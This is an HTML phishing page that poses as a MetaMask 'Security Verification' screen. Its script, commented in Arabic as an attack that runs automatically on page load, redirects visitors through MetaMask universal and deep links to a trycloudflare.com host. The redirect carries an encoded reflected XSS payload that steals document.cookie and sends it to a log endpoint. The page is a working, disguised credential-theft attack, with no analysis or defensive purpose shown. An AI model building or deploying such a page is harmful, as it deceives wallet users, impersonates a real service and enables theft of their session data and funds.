<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification | MetaMask</title>
    <style>
        body { background: #121212; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 100px; }
        .loader { border: 4px solid #333; border-top: 4px solid #f6851b; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { background: #f6851b; color: white; padding: 12px 24px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; text-decoration: none; display: inline-block; margin-top: 20px; }
    </style>
</head>
<body>

    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Head.svg" width="80" alt="MetaMask">
    <h2>Secure Bridge Active</h2>
    <p>Connecting to secure browser session...</p>
    <div class="loader"></div>
    
    <a href="javascript:void(0);" onclick="forceRedirect()" class="btn">Click here if not redirected</a>

    <script>
        // 1. رابط الـ Cloudflare الخاص بك
        const targetHost = "favour-nato-realized-instructor.trycloudflare.com";

        // 2. كود الـ XSS المراد عكسه (Reflected Payload)
        // يقوم بفتح تنبيه (Alert) ثم يرسل الكوكي إلى السيرفر
        const rawPayload = "<script>alert('XSS_Reflected_By_Heam');fetch('/log?stolen_data='+document.cookie);<\/script>";
        
        // 3. تشفير الـ Payload لضمان سلامة الرابط (URL Encoding)
        const xssQuery = "?xss=" + encodeURIComponent(rawPayload);

        // 4. بناء الروابط النهائية المدمجة مع الـ Payload
        const fullTarget = targetHost + xssQuery;
        const universalLink = "https://metamask.app.link/dapp/" + fullTarget;
        const deepLink = "metamask://dapp/" + fullTarget;

        function forceRedirect() {
            console.log("Redirecting to: " + fullTarget);
            
            // المحاولة الأولى: عبر الرابط الرسمي (Universal Link)
            window.location.href = universalLink;

            // المحاولة الثانية: عبر البروتوكول المباشر (Deep Link) بعد 800ms
            setTimeout(() => {
                window.location.replace(deepLink);
            }, 800);
        }

        // تشغيل الهجوم تلقائياً بمجرد فتح الصفحة
        window.onload = function() {
            setTimeout(forceRedirect, 1500); // تأخير بسيط لضمان تحميل الصفحة
        };
    </script>

</body>
</html>
